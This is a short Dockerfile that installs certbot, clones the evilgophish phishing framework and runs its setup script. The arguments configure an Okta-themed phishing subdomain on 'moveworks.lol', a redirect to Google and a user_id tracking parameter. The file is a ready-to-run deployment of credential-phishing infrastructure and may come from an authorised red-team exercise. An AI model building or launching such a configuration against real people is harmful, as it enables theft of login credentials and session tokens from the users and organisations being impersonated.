# FROM alpine AS compile-image

# # RUN apk add --no-cache python3 py-pip openssl ca-certificates python3-dev build-base wget
# RUN apk add python3 python3-dev py3-pip libaugeas0

# RUN python3 -m venv /opt/certbot/

# RUN /opt/certbot/bin/pip install --upgrade pip

# RUN /opt/certbot/bin/pip install certbot certbot-apache

# RUN ln -s /opt/certbot/bin/certbot /usr/bin/certbot
# WORKDIR /tools
# # COPY ./test.sh /tools
# # COPY requirements.txt /app/
# # RUN python3 -m venv /app
# # RUN /evilgophish/bin/pip install -r requirements.txt

FROM ubuntu:20.04 AS runtime-image

ARG DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y python3 python3-venv libaugeas0 git bash 

RUN python3 -m venv /opt/certbot/

RUN /opt/certbot/bin/pip install --upgrade pip

RUN /opt/certbot/bin/pip install certbot certbot-apache

RUN ln -s /opt/certbot/bin/certbot /usr/bin/certbot

RUN git clone https://github.com/fin3ss3g0d/evilgophish.git

WORKDIR /evilgophish

RUN chmod +x setup.sh
# /evilgophish/setup.sh moveworks.lol "okta" false https://www.google.com true user_id true
CMD ["/evilgophish/setup.sh","moveworks.lol","okta","false","https://www.google.com","true","user_id","true"]